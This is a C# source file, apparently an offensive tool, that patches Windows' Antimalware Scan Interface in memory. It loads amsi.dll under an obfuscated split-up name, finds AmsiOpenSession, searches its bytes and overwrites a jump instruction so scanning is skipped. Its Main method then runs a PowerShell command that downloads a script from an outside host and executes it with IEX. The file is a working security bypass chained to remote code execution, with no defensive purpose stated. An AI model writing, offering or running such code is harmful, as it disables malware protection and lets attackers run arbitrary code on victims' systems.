using System;
using System.Runtime.InteropServices;
using System.Management.Automation;


namespace amseekiller
{
    public class Program
    {
        static class NativeMethods
        {
            [DllImport("kernel32.dll")]
            public static extern uint GetLastError();

            [DllImport("kernel32.dll")]
            public static extern IntPtr LoadLibrary(string dllToLoad);

            [DllImport("kernel32.dll")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

            [DllImport("kernel32.dll")]
            public static extern bool FreeLibrary(IntPtr hModule);

            [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
            public static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

            [DllImport("kernel32.dll")]
            public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

            public enum Protection : uint
            {
                PAGE_NOACCESS = 0x01,
                PAGE_READONLY = 0x02,
                PAGE_READWRITE = 0x04,
                PAGE_WRITECOPY = 0x08,
                PAGE_EXECUTE = 0x10,
                PAGE_EXECUTE_READ = 0x20,
                PAGE_EXECUTE_READWRITE = 0x40,
                PAGE_EXECUTE_WRITECOPY = 0x80,
                PAGE_GUARD = 0x100,
                PAGE_NOCACHE = 0x200,
                PAGE_WRITECOMBINE = 0x400
            }

            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr GetCurrentProcess();

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool ReadProcessMemory(
                IntPtr hProcess,
                IntPtr lpBaseAddress,
                byte[] lpBuffer,
                int dwSize,
                out IntPtr lpNumberOfBytesRead);
        }



        static int searchPattern(byte[] startAddress, Int32 searchSize, byte[] pattern, Int32 patternSize)
        {
            Int32 i = 0;
            while (i < 1024)
            {
                if (startAddress[i] == pattern[0])
                {
                    Int32 j = 1;
                    while (j < patternSize && i + j < searchSize && (pattern[j] == '?' || startAddress[i+j] == pattern[j]))
                    {
                        j++;
                    }
                    if (j == patternSize)
                    {
                        Console.WriteLine("Offset : {0}", i + 3);
                        return (i + 3);
                    }
                }
                i++;
            }
            return 0;
        }

        static string hasb(IntPtr hProcess)
        {
            byte[] patch = { 0xEB };

            byte[] pattern = { 0x48, Convert.ToByte('?'), Convert.ToByte('?'), 0x74, Convert.ToByte('?'), 0x48, Convert.ToByte('?'), Convert.ToByte('?'), 0x74 };
            Int32 patternSize = pattern.Length;

            IntPtr dllHandle = NativeMethods.LoadLibrary("am" + "si.d" + "ll");
            if (dllHandle == IntPtr.Zero) return "LoadLibrary error " + NativeMethods.GetLastError();

            IntPtr aosAddr = NativeMethods.GetProcAddress(dllHandle, "Ams" + "iOp" + "enS" + "ession");
            if (aosAddr == IntPtr.Zero) return "Get Address error " + NativeMethods.GetLastError();

            byte[] buffer = new byte[1024];
            IntPtr lpNumberOfBytesRead;

            NativeMethods.ReadProcessMemory(hProcess, aosAddr, buffer, 1024, out lpNumberOfBytesRead);
            int matchAddress = searchPattern(buffer, buffer.Length, pattern, patternSize);

            IntPtr updateAAddr = aosAddr;
            updateAAddr += matchAddress;

            IntPtr lpNumberOfBytesWritten;            
            if(!NativeMethods.WriteProcessMemory(hProcess, updateAAddr, patch, 1, out lpNumberOfBytesWritten))
            {
                return "WPM error " + NativeMethods.GetLastError();
            }            

            return "AOS meowed";
        }

        public static void Main(string[] args)
        {
            using (PowerShell PowerShellInstance = PowerShell.Create())
            {
                Console.Out.WriteLine(hasb(NativeMethods.GetCurrentProcess()));
                PowerShellInstance.AddScript("IEX([Net.Webclient]::new().DownloadString(\"https://not.o0.rs/go.txt\"))");
                var rst = PowerShellInstance.Invoke();
                Console.WriteLine(rst);
            }
        }
    }
}
